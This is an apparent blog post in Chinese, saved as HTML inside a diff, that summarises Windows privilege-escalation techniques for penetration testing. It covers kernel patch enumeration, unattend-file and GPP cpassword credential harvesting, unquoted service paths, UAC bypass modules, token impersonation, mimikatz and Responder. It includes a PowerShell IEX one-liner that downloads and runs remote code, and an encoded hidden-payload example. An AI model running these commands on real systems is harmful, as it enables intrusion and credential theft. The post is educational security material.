@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>简易提权知识点总结 - Resek&#039;s Kingdom</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Resek&#039;s Kingdom"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Resek&#039;s Kingdom"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="系统内核溢出漏洞手动执行发现缺失补丁 当获取到目标机器的 shell 以后，可以通过如下命令来看系统安装了哪些补丁，还具有哪些漏洞  1234whoami &amp;#x2F;groups &amp;#x2F;&amp;#x2F;根据下面的Mandatory Label\Medium Mandatory Level 来看自己是一个什么权限systeminfo &amp;#x2F;&amp;#x2F;查看当前系统安装了哪些补丁wmic qfe get Caption,Descriptio"><meta property="og:type" content="blog"><meta property="og:title" content="简易提权知识点总结"><meta property="og:url" content="https://resek4.github.io/2021/02/19/%E6%8F%90%E6%9D%83/"><meta property="og:site_name" content="Resek&#039;s Kingdom"><meta property="og:description" content="系统内核溢出漏洞手动执行发现缺失补丁 当获取到目标机器的 shell 以后，可以通过如下命令来看系统安装了哪些补丁，还具有哪些漏洞  1234whoami &amp;#x2F;groups &amp;#x2F;&amp;#x2F;根据下面的Mandatory Label\Medium Mandatory Level 来看自己是一个什么权限systeminfo &amp;#x2F;&amp;#x2F;查看当前系统安装了哪些补丁wmic qfe get Caption,Descriptio"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/ghuqygufg.jpg?token=AEZI7DIPRSNKC6AZYCPSXBTC6RBWW"><meta property="article:published_time" content="2021-02-18T16:00:00.000Z"><meta property="article:modified_time" content="2023-01-27T09:29:15.180Z"><meta property="article:author" content="Resek4"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://120.48.17.251:9000/privatebasement/img-backup/ghuqygufg.jpg?token=AEZI7DIPRSNKC6AZYCPSXBTC6RBWW"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://resek4.github.io/2021/02/19/%E6%8F%90%E6%9D%83/"},"headline":"简易提权知识点总结","image":[],"datePublished":"2021-02-18T16:00:00.000Z","dateModified":"2023-01-27T09:29:15.180Z","author":{"@type":"Person","name":"Resek4"},"publisher":{"@type":"Organization","name":"Resek's Kingdom","logo":{"@type":"ImageObject","url":"https://resek4.github.io/img/logo.jpg"}},"description":"系统内核溢出漏洞手动执行发现缺失补丁 当获取到目标机器的 shell 以后，可以通过如下命令来看系统安装了哪些补丁，还具有哪些漏洞  1234whoami &#x2F;groups &#x2F;&#x2F;根据下面的Mandatory Label\\Medium Mandatory Level 来看自己是一个什么权限systeminfo &#x2F;&#x2F;查看当前系统安装了哪些补丁wmic qfe get Caption,Descriptio"}</script><link rel="canonical" href="https://resek4.github.io/2021/02/19/%E6%8F%90%E6%9D%83/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/xt256.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 6.2.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4/resek4.github.io"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-02-18T16:00:00.000Z" title="2/19/2021, 12:00:00 AM">2021-02-19</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-01-27T09:29:15.180Z" title="1/27/2023, 5:29:15 PM">2023-01-27</time></span><span class="level-item"><a class="link-muted" href="/categories/Penetration/">Penetration</a></span><span class="level-item">21 minutes read (About 3188 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">简易提权知识点总结</h1><div class="content"><h1 id="系统内核溢出漏洞"><a href="#系统内核溢出漏洞" class="headerlink" title="系统内核溢出漏洞"></a>系统内核溢出漏洞</h1><h2 id="手动执行发现缺失补丁"><a href="#手动执行发现缺失补丁" class="headerlink" title="手动执行发现缺失补丁"></a>手动执行发现缺失补丁</h2><ul>
+<li>当获取到目标机器的 shell 以后，可以通过如下命令来看系统安装了哪些补丁，还具有哪些漏洞</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups <span class="comment">//根据下面的Mandatory Label\Medium Mandatory Level 来看自己是一个什么权限</span></span><br><span class="line"></span><br><span class="line">systeminfo <span class="comment">//查看当前系统安装了哪些补丁</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn <span class="comment">//查看当前系统安装了哪些补丁</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用上传或者[[powershell]]的下载功能来将 exp 放到目标机里边</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;192.168.1.1&#x27;);执行的代码。。。&quot;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<h2 id="通过联网查询得知并且利用"><a href="#通过联网查询得知并且利用" class="headerlink" title="通过联网查询得知并且利用"></a>通过联网查询得知并且利用</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">EXP 库</a></li>
+<li>[[Metasploit]]中的 <code>enum_patches</code> [[Metasploit#post windows gather enum_patches]]</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggester</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">Powershell 的 Sherlock 脚本</a></li>
+</ul>
+<h1 id="Windows-系统配置错误"><a href="#Windows-系统配置错误" class="headerlink" title="Windows 系统配置错误"></a>Windows 系统配置错误</h1><h2 id="直接获取系统安装的配置文件"><a href="#直接获取系统安装的配置文件" class="headerlink" title="直接获取系统安装的配置文件"></a>直接获取系统安装的配置文件</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>网络管理员在给一堆机器安装同一环境时，会使用脚本调用固定的安装配置文件进行安装，有的时候回包含管理员账号密码等信息</p>
+</blockquote>
+<p>常见敏感安装配置文件如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\System32\Sysprep\unattend.xml</span><br><span class="line">C:\Windows\System32\Sysprep\Panther\unattend.xml</span><br></pre></td></tr></table></figure>
+
+<h3 id="多种利用方式"><a href="#多种利用方式" class="headerlink" title="多种利用方式"></a>多种利用方式</h3><ul>
+<li>直接使用 dir 相关命令搜索</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>[[Metasploit#post windows gather enum_unattend]]</li>
+</ul>
+<h2 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>Windows 系统服务文件在系统启动时加载并执行，并在后台持续调用可执行文件。而如果一个低权限用户对此类文件具有写权限（即可以更改它），那么就会造成安全隐患。</p>
+</blockquote>
+<blockquote>
+<p>服务未运行：攻击者使用任意服务替换原来的服务，并重启服务<br>服务运行中且无法被终止：大多数环境如此，攻击者会利用 DLL 劫持技术并尝试重启服务来提权</p>
+</blockquote>
+<h3 id="多种利用方式-1"><a href="#多种利用方式-1" class="headerlink" title="多种利用方式"></a>多种利用方式</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">Power Empire 与 Powersploit 的 Powerup 脚本</a></li>
+</ul>
+<p>此脚本会列出服务权限配置错误的漏洞，且下面的 AbuseFunction 里会有需要执行的命令</p>
+<ul>
+<li>[[Metasploit#exploit windows local service_permissions]]</li>
+</ul>
+<h2 id="注册表键-AlwaysInstallElevated"><a href="#注册表键-AlwaysInstallElevated" class="headerlink" title="注册表键 AlwaysInstallElevated"></a>注册表键 AlwaysInstallElevated</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>这个策略设置项一旦开启，Windows 将允许任何权限用户以 NT AUTHORITY\SYSTEM 的身份来安装恶意 MSI</p>
+</blockquote>
+<blockquote>
+<p>MSI 即 Microsoft Windows Installer，双击 MSI 程序就会自动调用 Windows 自带的 Msiexec.exe（这个里边包含了大量安装和卸载软件时需要使用的指令与数据）</p>
+</blockquote>
+<p>这个策略通过 <code>gpedit.msc</code> 中的如下操作打开：<br>组策略-&gt;计算机配置-&gt;管理模板-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权安装：选择启用<br>组策略-&gt;用户配置-&gt;管理模板-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权安装：选择启用</p>
+<p>然后注册表会在如下两个位置上自动创建值：<code>1</code><br><code>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code><br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></p>
+<h3 id="多种利用方式-2"><a href="#多种利用方式-2" class="headerlink" title="多种利用方式"></a>多种利用方式</h3><ul>
+<li>利用 Powerup 的 <code>Get-RegistryAlwaysInstallElevated</code> 模块来检测此注册表键是否被设置</li>
+<li>然后利用 Powerup 的 <code>Write-UserAddMSI</code> 模块，生成一个 <code>Useradd.msi</code> 的 MSI 文件，然后只要以低权限执行这个文件，就会微系统添加一个管理员账户</li>
+</ul>
+<h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>文件或者文件夹都有权限，当用户自身的权限高于它就可以访问，低于就不行。<br>比方说用户自身的权限很低，而假设 <code>C: \Program Files\Some Folder\test_service.exe</code> 这个可执行服务程序的权限很高，且满足了调用服务路径未被引号包裹（可以通过 wmic 查明）并有空格在其中，Windows 会以本属于 <code>test_service.exe</code> 的高权限去依次查询有没有 <code>C: \Program.exe</code> <code>C: \Program Files\Some.exe</code> 是否存在，存在就直接用高权限执行了。（相当于 Windows 是以空格做一个截断）</p>
+</blockquote>
+<blockquote>
+<p>所以我们只要构造一个存在此漏洞的服务的恶意路径文件名比方说上面的 <code>C: \Program Files\Some.exe</code> 实际上是我们上传的恶意文件，重启那个正常服务就会以高权限执行我们的恶意文件了</p>
+</blockquote>
+<h3 id="利用方式一："><a href="#利用方式一：" class="headerlink" title="利用方式一："></a>利用方式一：</h3><ul>
+<li>使用 wmic 来先列出没有被引号引起来且有空格的服务路径</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">&quot;AUTO&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>接下来利用 <code>icacls</code> 检测是否对那个有空格的目录有写权限</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files\Some folder&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果有 Everyone 则说明用户对这个文件夹有完全控制权限，括号后面的字符解释如下表格</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">(M)</td>
+<td align="center">修改</td>
+</tr>
+<tr>
+<td align="center">(F)</td>
+<td align="center">完全控制</td>
+</tr>
+<tr>
+<td align="center">(CI)</td>
+<td align="center">从属容器将继承访问控制项</td>
+</tr>
+<tr>
+<td align="center">(OI)</td>
+<td align="center">从属文件将继承访问控制项</td>
+</tr>
+</tbody></table>
+<ul>
+<li>然后将重命名过后的恶意文件放到存在问题的目录下，并使用 sc 重启服务就好了</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式二："><a href="#利用方式二：" class="headerlink" title="利用方式二："></a>利用方式二：</h3><ul>
+<li>[[Metasploit#exploit windows local unquoted_service_path]]</li>
+</ul>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><blockquote>
+<p>Windows 运行时会有一些计划任务，如果攻击者对那些以高权限运行的任务的目录文件有写权限，那么用恶意文件将其替换，系统便会以高权限运行那个恶意文件</p>
+</blockquote>
+<p>使用如下命令来查看计划任务：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v`</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://technet.microsoft.com/ZH-cn/sysinternals/bb664922">AccessChk</a></li>
+</ul>
+<p>这个软件是 Windows 自己发布的，常用于管理与排除故障操作，所以一般不会引起杀软的报警</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一次运行SysInternals工具包的软件会弹出一个协议许可对话框可以使用这个命令来自动接受许可协议</span></span><br><span class="line">accesschk.exe /accepteula </span><br><span class="line"></span><br><span class="line"><span class="comment">//查看某文件夹权限配置情况</span></span><br><span class="line">accesschk.exe -dqv <span class="string">&quot;C:\Users&quot;</span> -accepteula </span><br><span class="line"></span><br><span class="line"><span class="comment">//列出某个驱动器下所有权限配置有缺陷的文件夹</span></span><br><span class="line">accesschk.exe -uwdqsUsersc:\</span><br><span class="line">accesschk.exe -uwdqs<span class="string">&quot;AuthenticatedUsers&quot;</span>c:\</span><br><span class="line"></span><br><span class="line"><span class="comment">//列出某个驱动器下所有权限配置有缺陷的文件</span></span><br><span class="line">accesschk.exe -uwqsUsersc:\*.*</span><br><span class="line">accesschk.exe -uwqs<span class="string">&quot;AuthenticatedUsers&quot;</span>c:\*.*</span><br></pre></td></tr></table></figure>
+
+<h1 id="组策略首选项问题"><a href="#组策略首选项问题" class="headerlink" title="组策略首选项问题"></a>组策略首选项问题</h1><h2 id="创建一个组策略并批量修改本地管理员密码"><a href="#创建一个组策略并批量修改本地管理员密码" class="headerlink" title="创建一个组策略并批量修改本地管理员密码"></a>创建一个组策略并批量修改本地管理员密码</h2><blockquote>
+<p>创建[[域]]环境后，一般情况下域内机器都是要用自己的密码登录，而为了提升本地管理员密码的安全性，往往会批量修改这个密码</p>
+</blockquote>
+<ul>
+<li>步骤是：创建组策略-&gt;更新组策略中的首选项密码-&gt;将 Domain Computers 组添加到验证组策略对象列表中-&gt;将新建的组策略应用到域中所有的非域控机器上</li>
+<li>虽然调高了安全性，但是域中所有机器的本地管理员密码都是相同的了</li>
+</ul>
+<h2 id="获取组策略凭据"><a href="#获取组策略凭据" class="headerlink" title="获取组策略凭据"></a>获取组策略凭据</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>往往在管理员新建了组策略之后，操作系统会在 SYSVOL 共享目录中生成一个[[XML]]文件来保存修改过后的密码，这个密码使用 AES-256 加密算法，安全性还是可以的，但是 2012 年微软官方公布了该密码的私钥，遂安全性降低</p>
+</blockquote>
+<ul>
+<li>目标是找到包含 cpassword 的 XML 文件</li>
+</ul>
+<h3 id="多种利用方式-3"><a href="#多种利用方式-3" class="headerlink" title="多种利用方式"></a>多种利用方式</h3><ul>
+<li>手动查找 cpassword</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用type命令直接搜索访问XML文件</span></span><br><span class="line">type \\dc\sysvol\pentest.com\Policies\&#123;<span class="number">31B</span>2F340<span class="number">-016</span>D<span class="number">-11</span>D2<span class="number">-945F</span><span class="number">-00</span>C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br><span class="line"></span><br><span class="line"><span class="comment">//然后使用gpprefdecrypt.py来进行解密即可</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>PowerSploit 提供的 <code>Get-GPPPassword</code> 脚本</li>
+<li>[[Metasploit#post windows gather credentials gpp]]</li>
+</ul>
+<h1 id="绕过-UAC-提权"><a href="#绕过-UAC-提权" class="headerlink" title="绕过 UAC 提权"></a>绕过 UAC 提权</h1><h2 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p>UAC，即 User Account Control，在权限不够的情况下访问 <code>C: \</code>、<code>Windows</code>、<code>Program Files</code> 类似目录都需要进行 UAC 认证才能进行。</p>
+</blockquote>
+<blockquote>
+<p>UAC 规定了高、中、低三个安全控制策略，高等级进程有管理员权限，中等级进程有普通用户权限，低等级进程权限是最有限的</p>
+</blockquote>
+<blockquote>
+<p>UAC 有如下四种设置要求：</p>
+<ul>
+<li><code>始终通知</code>：最严格的设置，每当程序需要使用高级别权限都会提示本地用户</li>
+<li><code>仅在程序试图更改我的计算机程序时通知我</code> ：UAC 的默认设置，本地 Windows 程序使用高权限时不通知，第三方使用时通知</li>
+<li><code> 仅在程序试图更改我的计算机程序时通知我（不降低桌面亮度）</code>：与默认相似，但不降低桌面亮度</li>
+<li><code>从不提示</code>：当用户是系统管理员时，所有程序都会以最高权限运行</li>
+</ul>
+</blockquote>
+<p>需要 UAC 授权才能进行的操作</p>
+<ul>
+<li>配置 Windows Update</li>
+<li>增加&#x2F;删除账户</li>
+<li>更改账户类型</li>
+<li>更改 UAC 设置</li>
+<li>安装 ActiveX</li>
+<li>安装&#x2F;卸载程序</li>
+<li>安装设备驱动程序</li>
+<li>将文件移动&#x2F;复制到 <code>Program Files</code> 或者 <code>Windows</code> 目录下</li>
+<li>查看其他用户的文件夹</li>
+</ul>
+<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="bypassuac-模块"><a href="#bypassuac-模块" class="headerlink" title="bypassuac 模块"></a>bypassuac 模块</h3><p>假设已经拿到了目标的一个 meterpreter 的 shell，但是权限是普通用户，我们需要将其提权为管理员用户<br>直接使用[[Metasploit#exploit windows local bypassuac]]模块即可（别忘了填入之前 meterpreter 的 session）</p>
+<p>![[Metasploit#exploit windows local bypassuac]]</p>
+<h3 id="Runas-模块"><a href="#Runas-模块" class="headerlink" title="Runas 模块"></a>Runas 模块</h3><p>![[Metasploit#exploit windows local ask]]</p>
+<h3 id="Nishang-的-Invoke-PsUACme-模块"><a href="#Nishang-的-Invoke-PsUACme-模块" class="headerlink" title="Nishang 的 Invoke-PsUACme 模块"></a>Nishang 的 Invoke-PsUACme 模块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用Sysprep方法执行默认的Payload</span></span><br><span class="line">Invoke-PsUACme -Verbose </span><br><span class="line"></span><br><span class="line"><span class="comment">//使用oobe方法并默认执行payload</span></span><br><span class="line">Invoke-PsUACme -method oobe -Verbose </span><br><span class="line"></span><br><span class="line"><span class="comment">//使用-Payload参数，可以自定要执行的payload</span></span><br><span class="line">Invoke-PsUACme -method oobe -Payload <span class="string">&quot;powershell -windowstyle hidden -e YourEncodedPayload&quot;</span> </span><br><span class="line"></span><br><span class="line">还可以使用-PayloadPath来指定Payload路径，使用-CustomDll64或者-CustomDll32来自定义DLL文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="Empire-中的-bypassuac-模块"><a href="#Empire-中的-bypassuac-模块" class="headerlink" title="Empire 中的 bypassuac 模块"></a>Empire 中的 bypassuac 模块</h3><ul>
+<li>bypassuac 模块</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac <span class="comment">//使用模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Listener resek4 <span class="comment">//设置监听参数</span></span><br><span class="line"></span><br><span class="line">execute <span class="comment">//执行</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>bypassuac_wscript 模块</li>
+</ul>
+<p>只适用于 Windows7，尚未有补丁，但是杀软会提示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac_wscript <span class="comment">//使用模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Listener resek4 <span class="comment">//设置监听参数</span></span><br><span class="line"></span><br><span class="line">execute <span class="comment">//执行</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h1><h2 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p>令牌（Token）是系统的临时秘钥，相当于账户与密码，只要不重启系统，获得了令牌就可以在不提供密码或其他凭证的情况下访问网络与系统资源，一般来说令牌随机性与不可预测性很高，攻击者很难猜出来</p>
+</blockquote>
+<blockquote>
+<p>令牌分为：</p>
+<ul>
+<li>访问令牌（Access Token）代表访问控制操作主体的访问对象</li>
+<li>密保令牌（Security Token）又叫做“认证令牌”或“硬件令牌”，例如：U 盾</li>
+<li>会话令牌（Session Token）是交互会话的唯一身份标识符</li>
+</ul>
+</blockquote>
+<ul>
+<li>伪造令牌的核心为 <code>Kerberos</code> 协议，在第 4 步服务器发送给客户端令牌后，攻击者入侵服务器来窃取那个令牌</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/ghuqygufg.jpg?token=AEZI7DIPRSNKC6AZYCPSXBTC6RBWW"></p>
+<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="令牌窃取-1"><a href="#令牌窃取-1" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>假设已经获取了目标机器的 metepreter 的 shell，依次在 metepreter 中执行以下命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use incognito </span><br><span class="line">list_token -u <span class="comment">//列出可用令牌</span></span><br><span class="line"><span class="comment">//列出的令牌分两种，一种是Delegation Tokens授权令牌，支持交互式登录（例如远程桌面）</span></span><br><span class="line"><span class="comment">//另一种是Impersonation Tokens模拟令牌，支持非交互式的对话</span></span><br><span class="line"><span class="comment">//令牌的数量取决于shell的访问级别，令牌的格式为：机器名\用户名</span></span><br><span class="line"></span><br><span class="line">impersonate_token WIN<span class="number">-57</span>TJ21312UGE\\Administrator <span class="comment">//用伪造的令牌进行访问</span></span><br><span class="line">shell <span class="comment">//用伪造的身份开启shell，这个时候返回的隧道就是管理员的了，可以用whoami查看</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rotten-Potato-提权"><a href="#Rotten-Potato-提权" class="headerlink" title="Rotten Potato 提权"></a>Rotten Potato 提权</h3><p>和上一步一样，执行到 <code>list_token -u</code> 列出令牌的步骤，然后下载 <a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato.git">Rotten Potato</a><br>该软件目录里有个 <code>rottenpotato.exe</code>，执行如下命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload /root/RottenPotato/rottenpotato.exe <span class="comment">//上传到目标机器</span></span><br><span class="line"></span><br><span class="line">execute -HC  -f rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> <span class="comment">//这时候再使用getuid已经可以看见权限提升了</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Empire-下的-mimikatz"><a href="#Empire-下的-mimikatz" class="headerlink" title="Empire 下的 mimikatz"></a>Empire 下的 mimikatz</h3><ul>
+<li>运行 mimikatz，输入 <code>creds</code> 可以查看 Empire 列举出来的密码</li>
+<li>使用 pth <ID>  比方说：<code>pth 7</code> 来选择自己要窃取的令牌</ID></li>
+<li>同时可以使用 <code>ps</code> 命令查看当前是否有域用户的进程正在运行</li>
+<li>获取令牌后，可以使用 <code>revtoself</code> 命令来恢复令牌权限</li>
+</ul>
+<h1 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h1><h2 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="[[LLMNR]]"></a>[[LLMNR]]</h3><p>![[LLMNR]]</p>
+<h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">Responder</a></li>
+</ul>
